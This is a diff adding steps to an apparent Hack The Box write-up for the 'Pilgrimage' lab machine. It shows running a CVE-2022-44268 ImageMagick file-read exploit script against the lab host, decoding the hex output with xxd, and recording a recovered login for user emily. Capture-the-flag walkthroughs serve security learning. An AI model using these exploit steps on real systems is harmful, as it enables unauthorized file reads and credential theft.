@@ -100,3 +100,17 @@ python3 CVE-2022-44268.py --url http://pilgrimage.htb/shrunk/64f5b8058a661.png
   - root
   - emily
 
+- The code in `/register.php` contains:
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/4c690079-74ee-4b7b-b598-9bdad2152018)
+
+- Prepare a payload and read the file as done in the previous step. I had to modify the script as it was throwing an error. Now I get the output as hex.
+```
+python3 CVE-2022-44268.py --url http://pilgrimage.htb/shrunk/64f5bc11c30f2.png | tee data.hex
+```
+- Convert the received hex data as an image to string.
+```
+cat data.hex | xxd -r -p && echo ''
+```
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/bf82acca-237f-434e-8797-cebf1f19f690)
+
+- Credentials found: emily:abigchonkyboi123
